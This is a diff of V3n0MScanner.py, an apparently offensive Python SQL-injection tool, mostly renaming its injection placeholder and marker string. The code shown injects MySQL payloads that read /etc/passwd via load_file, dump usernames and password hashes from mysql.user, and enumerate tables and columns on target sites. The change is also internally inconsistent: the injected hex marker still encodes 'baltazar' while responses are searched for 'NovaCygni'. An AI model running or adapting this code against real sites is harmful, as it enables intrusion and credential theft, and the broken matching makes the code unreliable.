@@ -17,7 +17,7 @@
 #	--Prepare coding for Admin page finder
 #   ---Pause Scanning option
 #   ---Add MD5 and SHA1 Detection/Cracking
-#	
+#	---Remove "Dark" naming conventions, provide more accurate names
 #
 # V3n0MScanner.py - V.3.0.2
 #    -Increased headers list to include mobile devices headers 
@@ -3283,7 +3283,7 @@ while True:
 
 		print B + "\n[+] Gathering MySQL Server Configuration..."
 		for site in darkurl:
-			head_URL = site.replace("darkc0de",
+			head_URL = site.replace("evilzone",
 			                        "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
 			print R + "\n[+] Target:", O + site
 			while 1:
@@ -3301,33 +3301,33 @@ while True:
 						print "\tVersion:", version
 						version = version[0]
 
-						load = site.replace("darkc0de", "load_file(0x2f6574632f706173737764)")
+						load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
 						source = urllib2.urlopen(load).read()
 						if re.findall("root:x", source):
-							load = site.replace("darkc0de", "concat_ws(char(58),load_file(0x" + file.encode(
+							load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
 								"hex") + "),0x62616c74617a6172)")
 							source = urllib2.urlopen(load).read()
-							search = re.findall("baltazar", source)
+							search = re.findall("NovaCygni", source)
 							if len(search) > 0:
-								print "\n[!] w00t!w00t!: " + site.replace("darkc0de",
+								print "\n[!] w00t!w00t!: " + site.replace("evilzone",
 								                                          "load_file(0x" + file.encode("hex") + ")")
 
-							load = site.replace("dakrc0de",
+							load = site.replace("evilzone",
 							                    "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
 						source = urllib2.urlopen(load).read()
-						if re.findall("baltazar", source):
-							print "\n[!] w00t!w00t!: " + site.replace("darkc0de",
+						if re.findall("NovaCygni", source):
+							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
 							                                          "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"
 
 					print W + "\n[+] Number of tables:", len(tables)
 					print "[+] Number of columns:", len(columns)
 					print "[+] Checking for tables and columns..."
-					target = site.replace("darkc0de", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
+					target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
 					for table in tables:
 						try:
 							target_table = target.replace("T", table)
 							source = urllib2.urlopen(target_table).read()
-							search = re.findall("baltazar", source)
+							search = re.findall("NovaCygni", source)
 							if len(search) > 0:
 								print "\n[!] w00t!w00t! Found a table called: < " + table + " >"
 								print "\n[+] Lets check for columns inside table < " + table + " >"
@@ -3335,7 +3335,7 @@ while True:
 									try:
 										source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
 										                                              "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
-										search = re.findall("baltazar", source)
+										search = re.findall("NovaCygni", source)
 										if len(search) > 0:
 											print "\t[!] w00t!w00t! Found a column called: < " + column + " >"
 									except(KeyboardInterrupt, SystemExit):
